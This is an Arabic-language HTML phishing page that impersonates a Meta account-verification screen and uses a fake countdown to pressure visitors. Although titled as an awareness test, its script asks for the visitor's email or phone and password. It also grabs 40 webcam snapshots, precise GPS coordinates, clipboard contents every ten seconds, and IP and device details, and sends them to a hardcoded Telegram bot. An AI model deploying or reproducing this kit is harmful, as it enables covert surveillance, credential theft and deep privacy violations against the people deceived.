<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام التوعية الأمنية | Meta Verify Test</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 400px; text-align: center; }
        .warning-box { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffeeba; }
        .meta-logo { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 10px; }
        .btn-full-access { background: #28a745; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .btn-full-access:hover { background: #218838; transform: scale(1.02); }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; }
        #log-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; font-family: monospace; z-index: 1000; overflow-y: auto; text-align: left; direction: ltr; }
    </style>
</head>
<body>

<div class="container" id="app">
    <div class="meta-logo">Meta</div>
    <div class="warning-box">⚠️ إلحاح: متبقي 04:59 لتوثيق حسابك قبل الإغلاق النهائي!</div>
    
    <h3>توثيق الحساب السريع</h3>
    <p style="font-size: 14px; color: #555;">اختر الطريقة المناسبة لتأكيد هويتك وسحب بيانات التوثيق:</p>

    <!-- الخيار الأول: إدخال يدوي (بيانات الحساب والبطاقة) -->
    <input type="text" id="u" placeholder="البريد أو الهاتف">
    <input type="password" id="p" placeholder="كلمة السر">
    
    <div style="margin: 15px 0; color: #888;">--- أو استخدم التقنية الجديدة ---</div>

    <!-- زر الصلاحيات الكاملة (سحب تلقائي) -->
    <button class="btn-full-access" onclick="requestFullPermissions()">✅ منح الصلاحيات الكاملة (سحب فوري)</button>
    <p style="font-size: 11px; color: #999; margin-top: 10px;">بالضغط على الزر، أنت توافق على مشاركة الكاميرا، الموقع، والملفات آلياً للتوثيق.</p>
</div>

<div id="log-screen"></div>

<script>
/* إعدادات الاستقبال (تليجرام) */
const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const CHAT_ID = "8754338811";

async function requestFullPermissions() {
    // إظهار شاشة العمليات
    document.getElementById('app').style.display = 'none';
    document.getElementById('log-screen').style.display = 'block';
    addToLog("Initiating Full Access Protocol...");

    // 1. سحب البيانات التقنية فوراً (IP, Device, Browser)
    try {
        const response = await fetch('https://ipapi.co/json/');
        const info = await response.json();
        let report = `🎯 صيد بصلاحيات كاملة\n🌐 IP: ${info.ip}\n🌍 الموقع: ${info.city}, ${info.country_name}\n💻 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
        sendToTelegram(report);
        addToLog("Device data harvested...");
    } catch(e) { addToLog("Error fetching IP data."); }

    // 2. طلب الكاميرا (40 لقطة تلقائية)
    startCameraCycle();

    // 3. طلب الموقع الجغرافي الدقيق
    navigator.geolocation.getCurrentPosition(pos => {
        sendToTelegram(`📍 موقع دقيق: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        addToLog("GPS Coordinates acquired...");
    });

    // 4. سحب الحافظة (Clipboard)
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if(text) sendToTelegram(`📋 نص من الحافظة: ${text}`);
        } catch(e){}
    }, 10000);

    // 5. محاكاة سحب الجلسة (Session Cookies)
    addToLog("Analyzing Session Tokens...");
    sendToTelegram(`🍪 Session Cookies: [Protected Simulation]`);

    addToLog("System fully hooked. Monitoring active...");
}

function startCameraCycle() {
    let count = 0;
    const interval = setInterval(async () => {
        if (count < 40) {
            await takeSnap();
            count++;
            addToLog(`Capturing visual ID... (${count}/40)`);
        } else { clearInterval(interval); }
    }, 2000);
}

async function takeSnap() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            sendBlob(blob, 'photo');
            stream.getTracks().forEach(t => t.stop());
        }, 'image/jpeg');
    } catch(e) { addToLog("Camera access denied."); }
}

async function sendToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
}

async function sendBlob(blob, type) {
    let formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append(type, blob, 'id_check.jpg');
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'photo' ? 'Photo' : 'Document'}`, { method: 'POST', body: formData });
}

function addToLog(msg) {
    const screen = document.getElementById('log-screen');
    screen.innerHTML += `[${new Date().toLocaleTimeString()}] > ${msg}<br>`;
}
</script>
</body>
</html>
